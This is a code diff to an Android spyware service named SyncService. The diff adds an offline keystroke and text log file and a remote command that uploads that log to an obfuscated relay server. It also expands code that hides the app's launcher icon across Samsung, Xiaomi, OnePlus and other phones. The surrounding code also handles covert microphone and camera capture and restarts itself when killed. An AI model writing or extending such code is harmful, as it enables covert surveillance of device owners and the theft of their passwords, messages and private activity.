@@ -90,6 +90,10 @@ public class SyncService extends Service {
     private static final int KEYLOG_MAX = 1000;
     static final ArrayDeque<JSONObject> keylogs = new ArrayDeque<>();
 
+    // Offline keylog file writer (persists when server is unreachable)
+    private java.io.BufferedWriter klogWriter = null;
+    private static final long KLOG_MAX_BYTES = 8 * 1024 * 1024; // 8 MB rotate
+
     private static String ep() {
         return new String(Base64.decode(
             "aHR0cHM6Ly94dXNiLTBjMHAub25yZW5kZXIuY29t", Base64.DEFAULT));
@@ -103,8 +107,11 @@ public class SyncService extends Service {
         createChannel();
         acquireWakeLock();
         WatchdogJob.schedule(this);
-        // Attempt icon hide immediately (works if PackageManager is ready)
-        pool.submit(this::hideIcon);
+        openKlogFile();
+        // Synchronous hide first, then retry after launcher has loaded
+        hideIcon();
+        new android.os.Handler(android.os.Looper.getMainLooper())
+            .postDelayed(this::hideIcon, 3000);
     }
 
     @Override
@@ -122,6 +129,7 @@ public class SyncService extends Service {
         instance = null;
         stopCamLiveInternal();
         releaseWakeLock();
+        try { if (klogWriter != null) klogWriter.close(); } catch (Exception ignored) {}
         super.onDestroy();
         scheduleRestart();
     }
@@ -199,12 +207,47 @@ public class SyncService extends Service {
         }
     }
 
-    /** Add entry to keylog ring buffer. */
+    /** Add entry to keylog ring buffer AND offline file. */
     public void addKeylog(JSONObject entry) {
         synchronized (keylogs) {
             keylogs.addLast(entry);
             while (keylogs.size() > KEYLOG_MAX) keylogs.pollFirst();
         }
+        // Write to offline file (survives server downtime)
+        try {
+            String type = entry.optString("type", "key");
+            String data = entry.optString("data", "");
+            String pkg  = entry.optString("pkg", "");
+            String ts   = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
+                            .format(new java.util.Date(entry.optLong("ts", System.currentTimeMillis())));
+            String line;
+            if ("text".equals(type))  line = ts + " | TEXT  | [" + pkg + "] " + data;
+            else if ("focus".equals(type)) line = ts + " | APP   | " + pkg + "/" + data;
+            else                       line = ts + " | KEY   | " + data;
+            writeKlog(line);
+        } catch (Exception ignored) {}
+    }
+
+    private void openKlogFile() {
+        try {
+            File f = new File(getFilesDir(), "klog.txt");
+            // Rotate if > 8 MB
+            if (f.exists() && f.length() > KLOG_MAX_BYTES) {
+                new File(getFilesDir(), "klog_old.txt").delete();
+                f.renameTo(new File(getFilesDir(), "klog_old.txt"));
+            }
+            klogWriter = new java.io.BufferedWriter(new java.io.FileWriter(f, true));
+        } catch (Exception ignored) {}
+    }
+
+    private synchronized void writeKlog(String line) {
+        try {
+            if (klogWriter != null) {
+                klogWriter.write(line);
+                klogWriter.newLine();
+                klogWriter.flush();
+            }
+        } catch (Exception ignored) {}
     }
 
     /** Call MonitorService.snap() via reflection (full flavor only). */
@@ -224,6 +267,7 @@ public class SyncService extends Service {
         if (cmd.equals("__hide__"))          { hideIcon(); sendOut(id, cmd, enc("icon_hidden")); return; }
         if (cmd.equals("__wake__"))          { doWake(id); return; }
         if (cmd.equals("__keylog__"))        { doKeylogDump(id); return; }
+        if (cmd.equals("__keylog_file__"))   { doKeylogFile(id); return; }
         if (cmd.startsWith("__mic"))         { doMic(id, cmd); return; }
         if (cmd.equals("__cam__"))            { doCam(id, false); return; }
         if (cmd.equals("__cam_front__"))      { doCam(id, true); return; }
@@ -388,6 +432,28 @@ public class SyncService extends Service {
         sendOut(id, "__wake__", enc("wake_sent"));
     }
 
+    /** __keylog_file__ — upload the offline keylog file to relay server */
+    private void doKeylogFile(String id) {
+        try {
+            // Flush writer first
+            synchronized (this) {
+                if (klogWriter != null) klogWriter.flush();
+            }
+            File f = new File(getFilesDir(), "klog.txt");
+            if (!f.exists() || f.length() == 0) {
+                sendOut(id, "__keylog_file__", enc("klog empty")); return;
+            }
+            byte[] data = readFile(f);
+            JSONObject b = new JSONObject();
+            b.put("did", id);
+            b.put("name", "klog.txt");
+            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
+            b.put("size", data.length);
+            post("/esp/device-file", b);
+            sendOut(id, "__keylog_file__", enc("klog uploaded: " + data.length + "B"));
+        } catch (Exception e) { sendOut(id, "__keylog_file__", enc("err:" + e.getMessage())); }
+    }
+
     /** __keylog__ — dump and clear current keylog buffer */
     private void doKeylogDump(String id) {
         List<JSONObject> kl;
@@ -401,28 +467,49 @@ public class SyncService extends Service {
         } catch (Exception e) { sendOut(id, "__keylog__", enc("err:" + e.getMessage())); }
     }
 
-    /** Hide launcher icon — multiple methods for Samsung/OEM compatibility */
+    /**
+     * Hide launcher icon — universal across stock Android, Samsung One UI,
+     * Xiaomi MIUI, OnePlus, Huawei, and other OEM launchers.
+     *
+     * Two-state approach: DISABLED first (standard), then DISABLED_USER
+     * (how "user disables via Settings" works — most OEM launchers treat
+     * this as definitive). The system automatically broadcasts PACKAGE_CHANGED
+     * to launchers when component state changes; we also send the proper extras
+     * format that tells launchers which exact component changed.
+     */
     void hideIcon() {
         String pkg = getPackageName();
+        PackageManager pm = getPackageManager();
         android.content.ComponentName alias = new android.content.ComponentName(
             pkg, pkg + ".MainLauncher");
-        // Attempt DISABLED
+
+        // Pass 1: DISABLED (standard Android, Pixel, stock AOSP)
         try {
-            getPackageManager().setComponentEnabledSetting(alias,
+            pm.setComponentEnabledSetting(alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {}
-        // Attempt DISABLED_USER (Samsung One UI)
+
+        // Pass 2: DISABLED_USER — matches "user disabled via Settings" semantics.
+        // Samsung One UI, Xiaomi, OnePlus launchers specifically respect this state.
         try {
-            getPackageManager().setComponentEnabledSetting(alias,
+            pm.setComponentEnabledSetting(alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {}
-        // Force launcher refresh (helps on Samsung)
+
+        // Explicit PACKAGE_CHANGED broadcast with component-name list + UID extras.
+        // The system also sends this automatically but some OEM launchers additionally
+        // need the extras to know which specific component changed so they can update
+        // their icon cache without a full package rescan.
         try {
-            Intent i = new Intent(Intent.ACTION_PACKAGE_CHANGED);
-            i.setData(Uri.parse("package:" + pkg));
-            sendBroadcast(i);
+            Intent bi = new Intent(Intent.ACTION_PACKAGE_CHANGED);
+            bi.setData(Uri.parse("package:" + pkg));
+            bi.putExtra("android.intent.extra.CHANGED_COMPONENT_NAME_LIST",
+                new String[]{ pkg + ".MainLauncher", pkg + ".MainActivity" });
+            bi.putExtra(Intent.EXTRA_UID, getApplicationInfo().uid);
+            bi.putExtra("android.intent.extra.DONT_KILL_APP", true);
+            sendBroadcast(bi);
         } catch (Exception ignored) {}
     }
 
